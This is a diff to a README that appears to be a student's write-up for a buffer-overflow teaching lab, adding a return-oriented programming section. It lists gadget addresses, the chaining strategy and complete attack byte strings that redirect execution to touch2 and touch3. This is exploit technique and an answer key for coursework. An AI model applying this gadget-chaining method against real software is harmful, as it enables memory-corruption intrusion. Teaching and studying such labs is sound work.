@@ -25,7 +25,6 @@ can compile (use flag -Og) and disassemble it to look for gadgets.
 
 Utility program to generate byte sequences.  See documentation in lab
 handout.  
-<br>
 # Part I: Code Injection Attacks
 ```bash
 objdump -d ctarget >> c
@@ -103,4 +102,79 @@ fa 18 40 00 00 00 00 00
 00 00 00 00 00 00 00 00
 78 dc 61 55 00 00 00 00
 35 39 62 39 39 37 66 61 00  <- %rsp when finished getbuf()
+```
+# Part II: Return-Oriented Programming
+```bash
+objdump -d rtarget >> r
+```
+## Level 2
+1. move cookie to %rdi
+2. move touch2 address to %rsp  
+   
+```assembly
+4019ab: popq %rax
+4019a2: movq %rax,%rdi
+```
+So, the attack bytes: [phase4.txt](phase4.txt)
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+## Level 3
+1. Change cookie string to bytes
+2. Store bytes in somewhere and move it to %rdi
+3. move touch3 address to %rsp
+
+Assembly code we can use:
+```assembly
+4019ab: popq %rax
+4019a2: movq %rax,%rdi
+4019d6: lea  (%rdi,%rsi,1),%rax
+4019dd: movl %eax,%edx
+401aad: movq %rsp,%rax
+401a70: movl %edx,%ecx
+401a13: movl %ecx,%esi
+```
+The relationship between registers:  
+<img src="phase5.png" width="400"/>  
+So, the strategy is:
+```assembly
+401aad: movq %rsp,%rax
+4019a2: movq %rax,%rdi
+4019ab: popq %rax
+48
+4019dd: movl %eax,%edx
+401a70: movl %edx,%ecx
+401a13: movl %ecx,%esi
+4019d6: %rsi+%rdi -> %rax
+4019a2: movq %rax,%rdi
+4018fa: touch3
+35 39 62 39 39 37 66 61 00
+```
+Here 0x48 = 8 * 9 = 72  
+So, the attack bytes: [phase5.txt](phase5.txt)
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ad 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+70 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61 00
 ```
